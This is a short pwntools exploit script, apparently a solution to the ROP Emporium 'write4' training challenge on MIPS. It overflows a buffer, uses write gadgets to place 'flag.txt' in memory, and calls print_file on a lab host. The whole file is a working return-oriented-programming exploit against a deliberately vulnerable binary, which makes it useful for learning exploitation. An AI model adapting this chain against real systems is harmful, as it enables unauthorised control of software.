from pwn import *
BINARY = "./write4_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

gadget_write = 0x00400930
gadget_print = 0x00400948
print_file = ELF.symbols['print_file']

rop = b"A" * 0x24
rop += p32(gadget_write)
rop += b"B" * 0x4
rop += b"flag"
rop += p32(0x00411000)

rop += p32(gadget_write)
rop += b"B" * 0x4
rop += b".txt"
rop += p32(0x00411004)

rop += p32(gadget_print)
rop += b"B" * 0x4
rop += p32(print_file)
rop += p32(0x00411000)

p = remote("10.0.0.2", 9999)
p.sendline(rop)
print(p.recvline_contains(b"ROPE"))